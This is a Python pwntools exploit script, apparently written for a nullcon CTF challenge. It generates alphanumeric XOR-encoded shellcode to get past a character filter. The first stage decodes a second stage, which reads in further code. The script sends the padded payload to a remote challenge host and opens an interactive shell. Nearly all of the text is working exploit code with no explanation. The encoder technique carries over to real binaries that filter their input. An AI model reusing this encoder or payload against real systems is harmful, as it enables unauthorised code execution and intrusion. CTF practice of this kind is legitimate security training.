from pwn import *
from heaputils import *

CHSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

context.os = 'linux'
context.arch = 'amd64'

class XOREncoder():
	#assumes initial rax to be NULL, sc must be given as bytearray, not string
	def __init__(self,sc,offset,initial_al=0):
		self.al = initial_al
		self.code = ""
		self.shellcode = sc
		self.offset = offset
		for x in range(offset,offset+len(sc)):
			assert(chr(x) in CHSET)

	def compute(self):
		TOTAL = len(self.shellcode)
		for i,ch in enumerate(self.shellcode):
			if (i+self.offset)%2 == 0:
				original_char = ord("P")
			else:
				original_char = ord("Z")

			intermediates = self.find_xor_inters(ch^original_char)
			for x in intermediates:
				self.code += "xor al, {}\n".format(x)
			self.code += "xor byte ptr [rcx+{}],al\n".format(self.offset+i)
			self.al = ch^original_char
			log.info("computed %d/%d chars"%(i+1,TOTAL))

		# turn al back to 0
		intermediates = self.find_xor_inters(0)
		for x in intermediates:
			self.code += "xor al, {}\n".format(x)

	def find_xor_inters(self,final):
		inters = []
		temp = self.al

		while True:
			if(chr(temp^final) in CHSET):
				inters.append(temp^final)
				break
			med = ord(random.choice(CHSET)) #lazy coding
			temp = temp^med
			inters.append(med)

		return inters


	def dump_asmcode(self):
		return self.code




def debug(p):
	PIE = get_PIE(p)
	bp = PIE + 0xE4C
	gdb.attach(p,gdbscript = "b*0x%x"%bp)

p = remote("pwn.ctf.nullcon.net", 4011)
#p = remote("localhost",4013)
#all of the code here must have ascii values smaller than 0x80
stage2_d = ''' 
push rcx
push rcx
pop rsi
xor al,0x7F
push rax
pop rdx
xor al,0x7F
xor al,1
push rax
pop rdi
syscall
'''

stage2 = asm(stage2_d)
assert len(stage2)<=26
encoder = XOREncoder(bytearray(stage2),0x41)

log.info("generating alphanumeric shellcode...")
encoder.compute()
log.info("done generating alphanumeric shellcode")

NOP_E = "PZ"
NOP_O = "QAX"

#XOR encode: requires a single bit bruteforce
stage1_d = '''
push rax
push rdi
pop rax
xor ax,0x3030 
xor al,0x30
push rax
pop rcx
pop rax
'''

stage1_d+=encoder.dump_asmcode()
stage1 = asm(stage1_d)

if(len(stage1)%2==1):
	stage1 += NOP_O

L = len(stage1)
assert(L%2==0)
L = (0x4000-L)//2

stage1 += NOP_E*(L-1)

p.send(stage1)
sleep(0.4)

p.interactive()

